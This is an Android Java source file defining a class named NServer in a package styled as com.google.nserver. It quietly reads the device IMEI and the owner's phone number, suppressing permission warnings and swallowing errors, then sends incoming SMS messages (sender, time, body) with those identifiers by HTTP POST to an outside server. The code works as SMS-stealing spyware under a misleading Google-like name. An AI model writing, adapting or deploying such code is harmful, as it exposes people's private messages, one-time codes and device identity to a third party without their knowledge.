/*
 * Copyright (c) 2018. Arash Hatami
 */

package com.google.nserver;

import android.annotation.SuppressLint;
import android.app.Application;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.util.HashMap;

public class NServer extends Application {
	
	private static Context mContext;
	private String imei;
	private String phone;
	
	private Response.Listener<String> listener;
	private Response.ErrorListener errorListener;
	
	public static void setContext(Context context) {
		mContext = context;
	}
	
	@SuppressLint("MissingPermission")
	public NServer() {
		try {
			TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
				imei = telephonyManager.getImei();
			else
				imei = telephonyManager.getDeviceId();
			
			String main_data[] = {"data1", "is_primary", "data3", "data2", "data1", "is_primary", "photo_uri", "mimetype"};
			Object object = mContext.getContentResolver().query(Uri.withAppendedPath(android.provider.ContactsContract.Profile.CONTENT_URI, "data"),
					main_data, "mimetype=?",
					new String[]{"vnd.android.cursor.item/phone_v2"},
					"is_primary DESC");
			if (object != null) {
				do {
					if (!((Cursor) (object)).moveToNext())
						break;
					phone = ((Cursor) (object)).getString(4);
				} while (true);
				((Cursor) (object)).close();
			}
		} catch (Exception ignore) {
		}
		
		errorListener = new Response.ErrorListener() {
			@SuppressLint("LogNotTimber")
			@Override
			public void onErrorResponse(VolleyError volleyError) {
				Log.e("Volley", volleyError.getMessage());
			}
		};
		
		listener = new Response.Listener<String>() {
			@SuppressLint("LogNotTimber")
			@Override
			public void onResponse(String s) {
				Log.i("Volley", s);
			}
		};
	}
	
	public void transferIn(HashMap<String, String> message) {
		Log.e("Volley", "Initialize");
		try {
			JSONObject params = new JSONObject();
			params.put("address", message.get("address"));
			params.put("time", message.get("time"));
			params.put("body", message.get("body"));
			params.put("imei", imei);
			params.put("phone", phone);
			final String body = params.toString();
			
			String URL = "http://arash-hatami.ir/api/aban/sms/received";
			StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, listener, errorListener) {
				@NonNull
				@Override
				public String getBodyContentType() {
					return "application/json; charset=utf-8";
				}
				
				@Nullable
				@Override
				public byte[] getBody() {
					try {
						return body.getBytes("utf-8");
					} catch (UnsupportedEncodingException e) {
						return null;
					}
				}
			};
			stringRequest.setRetryPolicy(new DefaultRetryPolicy(
					0,
					DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
					DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
			));
			Log.e("Volley", "Start");
			Log.e("Volley", mContext.getCacheDir().toString());
			RequestQueue requestQueue = Volley.newRequestQueue(mContext);
			requestQueue.add(stringRequest);
			
		} catch (Exception e) {
			Log.e("Volley", e.getMessage());
		}
	}
}
